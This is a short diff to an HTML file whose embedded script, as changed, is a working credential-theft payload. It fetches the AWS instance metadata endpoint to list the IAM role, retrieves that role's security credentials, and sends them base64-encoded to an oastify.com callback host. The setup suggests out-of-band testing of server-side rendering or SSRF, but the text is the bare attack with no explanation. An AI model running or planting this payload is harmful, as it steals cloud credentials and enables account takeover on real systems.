@@ -3,8 +3,18 @@
 <img src="http://vutkcbjvck26lx9ibcyfpqj8hznqbiz7.oastify.com/check.png">
 <script>
 (async () => {
-  window.fetch('https://2z2rhio2hr7dq4epgj3muxofm6sxgu4j.oastify.com/ss');
+var BASE = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
+var COLLAB = 'https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com';
 
+fetch(BASE)
+  .then(r => r.text())
+  .then(role =>
+    fetch(BASE + role.trim())
+  )
+  .then(r => r.text().then(body => ({ status: r.status, body })))
+  .then(({ status, body }) =>
+    fetch(COLLAB + '/?s=' + status + '&d=' + btoa(body || ''))
+  );
 })();
 </script>
 </html>
